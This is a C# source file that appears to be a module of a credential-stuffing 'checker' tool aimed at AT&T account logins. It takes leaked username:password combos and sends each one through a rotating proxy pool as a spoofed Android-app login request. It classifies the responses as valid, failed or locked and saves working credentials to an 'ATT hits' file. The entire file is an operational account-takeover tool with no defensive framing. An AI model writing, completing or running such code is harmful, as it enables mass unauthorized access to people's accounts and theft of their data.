using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Brute
{
    class Att
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                string str1 = httpRequest.Post("URL HERE", "password=" + strArray1[1] + "&mkLanguage=EN&client_version=1aa36c82-b719-7v73-a1b3-3e62a036a2dc%2F22&rememberMe=on&deviceType=PHONE&TG_OP=TokenGen%2CWebTokenGen&userid=" + strArray1[0] + "&deviceMake=LGE&deviceIdentifier=&client_type=android%2F1.0&deviceOSVersion=22&appID=cOHhwFrNDPEt5f%2FG4B4uF5VgIwI%3D&respType=json&mkSDKVersion=1.0.93&deviceModel=LGM-V300K&rememberID=on&mkVersion=&pushToken=&deviceOS=android&", "application/x-www-form-urlencoded").ToString();
                if (str1.Contains("userID"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo}", Color.Green);
                    }
                    Program.Save(combo, "ATT hits");
                    return true;
                }
                else if (str1.Contains("Invalid ID or Password") || str1.Contains("ID Soft Locked") || str1.Contains("ID Hard Locked") || str1.Contains("ID disabled fraud locked level 1") || str1.Contains("Legacy DirecTV ID status is pending ") || str1.Contains("ID not Authorized") || str1.Contains("ID disabled fraud locked level 2") || str1.Contains("ID collision Error") || str1.Contains("DBAN Biller Migrated"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else if (str1.Contains("ID_HARD_LOCKED"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Orange);
                    }
                    Program.Save(combo, "Xbox 2FA");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
